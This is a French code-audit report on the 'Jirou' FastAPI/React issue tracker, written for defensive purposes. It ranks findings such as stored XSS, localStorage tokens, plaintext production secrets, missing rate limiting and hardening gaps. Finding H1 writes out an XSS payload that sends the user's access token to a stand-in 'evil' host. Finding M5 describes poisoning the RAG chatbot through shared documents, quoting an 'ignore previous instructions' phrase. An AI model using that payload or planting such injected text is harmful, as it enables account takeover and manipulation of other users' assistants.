# Rapport d'audit de code — Jirou

**Date :** 2026-07-10
**Périmètre :** backend FastAPI (`backend/app`), frontend React/Vite (`frontend/src`), configuration de déploiement (Docker, CI, `.env`).
**Méthode :** revue manuelle des primitives de sécurité (auth, JWT, hachage), des dépendances d'autorisation, de l'ensemble des ~15 modules d'endpoints et de leurs services, du stockage de fichiers (path traversal), du rendu HTML côté frontend et de la configuration de production.

---

## Synthèse

L'application est globalement **bien construite et défensivement solide** : les autorisations projet sont centralisées et appliquées de façon **cohérente** sur tous les endpoints, il n'y a **pas d'injection SQL** (ORM SQLAlchemy paramétré), le **path traversal est correctement bloqué** sur les téléchargements, les mots de passe sont hachés en **bcrypt**, et les garde-fous métier (dernier admin, auto-désactivation) sont présents.

Les problèmes réels se concentrent sur **trois axes** : une **XSS stockée** exploitable, une gestion de session **non révocable**, et l'**absence de limitation de débit**. Un tableau récapitulatif figure en fin de rapport.

| Sévérité | Nombre |
|----------|--------|
| 🔴 Critique / Élevé | 3 |
| 🟠 Moyen | 5 |
| 🟡 Faible / Durcissement | 7 |

---

## 🔴 Élevé

### H1 — XSS stockée via les descriptions de tickets et les commentaires

**Fichiers :** `frontend/src/features/issues/RichTextEditor.tsx:145` · `backend/app/schemas/issue.py:113,136` · `backend/app/schemas/comment.py`

Le corps des commentaires (`body: str`) et la description des tickets (`description: str | None`) sont **stockés tels quels côté serveur, sans aucune sanitisation HTML**. Côté frontend, ils sont rendus par `RichTextView` avec :

```tsx
<div dangerouslySetInnerHTML={{ __html: html }} />
```

Recherche confirmée : **aucun `DOMPurify` / sanitize** dans tout le frontend (un seul `dangerouslySetInnerHTML`, non protégé). L'éditeur Tiptap n'assainit que ce qui transite par l'UI ; or l'API accepte **n'importe quelle chaîne HTML** via un appel direct.

**Scénario d'exploitation :** un membre (ou un viewer, qui peut commenter) envoie via l'API un commentaire dont le corps est
`<img src=x onerror="fetch('https://evil/'+localStorage.getItem('jirou.access_token'))">`.
Le script s'exécute dans le navigateur de **chaque membre** qui ouvre le ticket → vol de session (cf. H2), actions à leur place, propagation.

**Recommandation :** sanitiser le HTML **au rendu** (DOMPurify sur le résultat de `RichTextView`) **et** à l'entrée côté serveur (allow-list de balises). Ne jamais faire confiance au HTML produit par l'éditeur.

---

### H2 — Jetons d'accès et de rafraîchissement stockés dans `localStorage`

**Fichier :** `frontend/src/stores/authStore.ts`

`accessToken` et `refreshToken` sont persistés en `localStorage` (`jirou.access_token`, `jirou.refresh_token`). Le `localStorage` est **lisible par tout JavaScript de la page** : combiné à H1, il transforme une XSS en **prise de contrôle complète de compte** (le refresh token vole 7 jours de validité, cf. H4).

**Recommandation :** stocker le refresh token dans un cookie `HttpOnly` + `Secure` + `SameSite`, et garder l'access token en mémoire seulement. À défaut de refonte, la correction de H1 (sanitisation) est le rempart minimal indispensable.

---

### H3 — Secrets de production réels présents en clair dans l'arborescence

**Fichier :** `.env`

Le fichier `.env` contient des **credentials de production actifs** en clair :

- mot de passe PostgreSQL,
- `JWT_SECRET_KEY` (clé de signature des jetons),
- **clé API Mistral** (`MISTRAL_API_KEY=...`) — credential tiers **facturable**,
- **mot de passe du compte admin** (`ADMIN_PASSWORD=...`).

Point positif : `.env` est bien couvert par `.gitignore` et **n'apparaît pas dans l'historique git** (vérifié). Le risque n'est donc pas une fuite git, mais la présence de secrets réels en clair sur le disque / dans toute copie ou sauvegarde du dépôt.

**Recommandation :** considérer ces secrets comme **compromis** et les **faire tourner** (rotation), en priorité la clé Mistral et le `JWT_SECRET_KEY` (une rotation de ce dernier invalide toutes les sessions — bénéfice de sécurité). Envisager un gestionnaire de secrets plutôt qu'un fichier `.env` sur l'hôte.

---

## 🟠 Moyen

### M1 — Aucune protection anti-force-brute sur `/auth/login`

**Fichier :** `backend/app/api/v1/endpoints/auth.py:56`

Aucune limitation de débit, aucun verrouillage, aucun captcha sur le login. Le compte admin utilise un email **connu/documenté** (`admin@jirou.app`), ce qui facilite une attaque ciblée par dictionnaire.

**Recommandation :** rate-limiting par IP/compte (ex. `slowapi`), backoff progressif, verrouillage temporaire.

### M2 — Sessions non révocables, refresh token ni tourné ni invalidé

**Fichiers :** `backend/app/api/v1/endpoints/auth.py:78` · `frontend/src/stores/authStore.ts` (`logout`)

- Le `logout` est **purement côté client** (efface le `localStorage`) : un jeton déjà volé reste valide.
- `/auth/refresh` **ne renvoie pas de nouveau refresh token** (pas de rotation) ; le refresh initial reste valable 7 jours.
- Le **changement de mot de passe n'invalide pas** les jetons existants.

Il n'existe aucun store de session / liste de révocation côté serveur.

**Recommandation :** rotation des refresh tokens, `jti` + liste de révocation (ou versioning de session par utilisateur invalidé au logout / changement de mot de passe).

### M3 — Import CSV : lecture intégrale en mémoire sans borne de taille

**Fichier :** `backend/app/api/v1/endpoints/issues.py:239`

```python
csv_bytes = file.file.read()   # aucun plafond de taille
```

Contrairement aux pièces jointes (qui **streament** avec `MAX_UPLOAD_SIZE`), l'import lit tout le fichier en mémoire. La limite `MAX_ROWS = 1000` n'est vérifiée **qu'après** décodage complet. Un upload volumineux provoque une **consommation mémoire non bornée** (DoS).

**Recommandation :** plafonner la taille lue (ex. `MAX_UPLOAD_SIZE`) **avant** le décodage, en rejetant au-delà (413).

### M4 — Endpoints RAG sans limitation → DoS par coût

**Fichier :** `backend/app/api/v1/endpoints/rag.py:53,77`

Tout membre peut appeler `/rag/reindex` et `/rag/chat` à volonté ; chaque appel déclenche des requêtes **facturables** vers l'API Mistral (embeddings / complétion). Un utilisateur peut épuiser le budget/quota Mistral (déni de service économique). Accessoirement, `/rag/chat` est exposé à l'**injection de prompt** via le contenu des tickets/documents (impact limité ici, mais à garder en tête).

**Recommandation :** rate-limiting dédié sur ces routes ; éventuellement réserver `reindex` aux admins.

### M5 — Empoisonnement du RAG via les documents « généraux » ouverts à tous

**Fichiers :** `backend/app/api/v1/endpoints/documents.py:196-209` · `backend/app/services/rag.py:237-259,320-336`

**Tout utilisateur authentifié** (y compris un viewer global) peut créer un document « général » (`project_id = NULL`) via `POST /documents`. Ces documents sont **lisibles par tous** et **indexés dans Qdrant avec `is_general=True`**, donc systématiquement inclus dans le contexte du chatbot de **n'importe quel autre utilisateur** (le filtre d'accès autorise toujours `is_general=True`).

**Scénario :** un utilisateur à faibles privilèges crée un document général contenant des instructions d'injection de prompt (« ignore les consignes précédentes… ») ou du contenu trompeur ; ce texte remonte dans les réponses du chatbot de tous les autres utilisateurs, sans qu'ils aient jamais ouvert le document (injection de prompt / désinformation transverse).

**Recommandation :** restreindre la création de documents généraux (ex. admin global), ou isoler/valider leur usage dans le RAG.

---

## 🟡 Faible / Durcissement

### L1 — Secrets par défaut non sécurisés dans la config

**Fichier :** `backend/app/core/config.py:26,29`

`JWT_SECRET_KEY = "change-me-in-production"` et un mot de passe DB par défaut sont codés en dur. Si le `.env` n'est pas chargé, l'application démarre **silencieusement** avec une clé JWT publique → jetons **forgeables**.

**Recommandation :** échouer au démarrage (fail-fast) si `JWT_SECRET_KEY` vaut la valeur par défaut hors environnement de développement.

### L2 — Swagger / OpenAPI exposés publiquement en production

**Fichier :** `backend/app/main.py:14-19`

`/docs` et `/openapi.json` sont activés inconditionnellement → divulgation de toute la surface d'API.

**Recommandation :** désactiver (ou protéger) `docs_url`/`openapi_url` en production.

### L3 — Caractères génériques `ilike` non échappés dans la recherche

**Fichier :** `backend/app/services/search.py:39-40`

`q` est interpolé en `%{q}%` / `{q}%` sans échapper `%` et `_`. Ce n'est **pas** une injection (requête paramétrée), mais permet un abus de jokers (motifs coûteux).

**Recommandation :** échapper `%`, `_`, `\` avant le `ilike`.

### L4 — Import CSV : `story_points` négatifs acceptés

**Fichier :** `backend/app/services/issue_import.py:112`

`int(points_raw)` n'applique pas le `ge=0` que le schéma API impose (`IssueCreate.story_points`). Un CSV peut donc insérer des points négatifs → incohérence de données.

**Recommandation :** rejeter (ou avertir) les valeurs `< 0` à l'import.

### L5 — Domaine « Veille » : lecture globale de tous les nœuds/médias

**Fichier :** `backend/app/api/v1/endpoints/watch.py`

Par conception, la veille est globale : **tout utilisateur connecté** peut lister, lire et télécharger l'ensemble des nœuds et médias (seule la suppression/édition est réservée au créateur/admin). C'est un **choix assumé** ; à confirmer qu'aucune donnée sensible ne doit y être cloisonnée par projet.

*Note positive :* les téléchargements (`FileResponse` avec `filename=`) forcent un `Content-Disposition: attachment`, ce qui **neutralise** le rendu inline d'un fichier HTML malveillant téléversé — ce vecteur est donc correctement géré.

### L6 — Notifications : fuite résiduelle de clé de ticket / id de projet après retrait

**Fichier :** `backend/app/api/v1/endpoints/notifications.py:27-39`

`NotificationRead` dérive `issue_key` et `project_id` de l'issue liée. Un utilisateur **retiré d'un projet** conserve ses anciennes notifications et continue de voir la clé de ticket et l'`project_id` correspondants via `GET /notifications`. Impact limité (identifiants qu'il connaissait déjà, pas de contenu du ticket), mais c'est une fuite d'information après révocation d'accès.

**Recommandation :** filtrer/masquer les notifications dont l'utilisateur n'est plus membre du projet, ou purger à la sortie.

### L7 — Absence de garde `None` dans les résolveurs de contexte par identifiant

**Fichiers :** `issues.py:116-117` · `comments.py:74-76` · `sprints.py:114-115` · `documents.py:113-114` · `labels.py:80-81`

Après `db.get(Issue/Project, …)`, le résultat est déréférencé (`project.id`, `issue.project_id`) sans vérifier `None`. Non exploitable tant que l'intégrité référentielle (cascades FK) tient — dans le pire cas une ligne orpheline renverrait **500** au lieu de **404**. Remarque de robustesse (défense en profondeur).

**Recommandation :** garde `None` explicite → 404.

*Remarque logique (non-sécurité) — `services/sprint.py:191` :* dans `complete_sprint`, `committed_points` est calculé sur **toutes** les issues présentes à la clôture (scope final), pas sur l'engagement initial du sprint. Les ajouts en cours de sprint gonflent donc la « vélocité engagée ». Comportement documenté, mais à confirmer avec le besoin métier.

---

## Points positifs (contrôles vérifiés comme corrects)

- **Autorisation cohérente & sans IDOR** : chaque ressource résolue par identifiant (commentaire, vue sauvegardée, notification, sprint, document, pièce jointe, dépendance) revérifie l'appartenance au projet **et** la propriété. Vérifié sur `issues`, `comments`, `projects`, `sprints`, `documents`, `saved_views`, `notifications`, `attachments`, `watch`, `stats`, `activity`, `rag`, `users`.
- **Pas d'injection SQL** : requêtes SQLAlchemy paramétrées, filtrage systématique par projets de l'appelant (recherche & RAG inclus).
- **Path traversal bloqué** : `resolve_path` valide `is_relative_to(root)` + nom de fichier assaini (UUID + allow-list de caractères).
- **JWT** : vérification du claim `type` (access vs refresh), expiration, compte désactivé rejeté.
- **Garde-fous métier** : impossible de se retirer son propre rôle admin / de se désactiver ; protection du « dernier admin » projet et du lead.
- **Séparation des rôles** : `viewer` correctement interdit en écriture ; `register` force le rôle `member` (pas d'auto-élévation).
- **MarkdownView** (documents) utilise `react-markdown` **sans** `rehype-raw` → HTML brut échappé, pas de XSS par ce canal.
- **Prod** : Postgres et Qdrant non exposés publiquement ; backend derrière Caddy en `127.0.0.1`.

---

## Priorisation recommandée

1. **H1** (sanitiser le HTML — DOMPurify au rendu + allow-list serveur) — *le correctif à plus fort impact.*
2. **H3** (rotation des secrets, en priorité clé Mistral + JWT).
3. **H2 / M2** (revoir le stockage des jetons et rendre les sessions révocables).
4. **M1 / M3 / M4** (rate-limiting login & RAG, borne de taille de l'import CSV).
5. **L1 → L5** (durcissement).
